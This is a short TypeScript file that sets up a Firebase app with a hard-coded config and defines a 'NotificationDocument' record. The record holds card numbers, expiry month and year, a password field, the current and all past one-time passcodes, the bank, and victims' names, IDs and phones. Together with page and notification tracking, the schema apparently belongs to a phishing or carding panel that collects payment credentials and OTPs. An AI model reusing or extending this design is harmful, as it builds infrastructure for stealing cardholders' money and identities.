import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyCzNSkFUhkO64TBxdTFJV4diD0YYlwRbWQ',
  authDomain: 'edeewq-5432d.firebaseapp.com',
  projectId: 'edeewq-5432d',
  storageBucket: 'edeewq-5432d.firebasestorage.app',
  messagingSenderId: '639520471860',
  appId: '1:639520471860:web:663f86432852e63bbdc361',
  measurementId: 'G-SQ35T785N1',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  allOtps: string[];
  bank: string;
  bank_card: string[];
  cardNumber: string;
  cardState: string;
  createdDate: string;
  currentPage: number;
  hasPersonalInfo: boolean;
  id: string;
  month: string;
  notificationCount: number;
  otp: string;
  pass: string;
  prefix: string;
  status: string;
  year: string;
  personalInfo: {
    fullName: string;
    id: string;
    phone: string;
  };
}
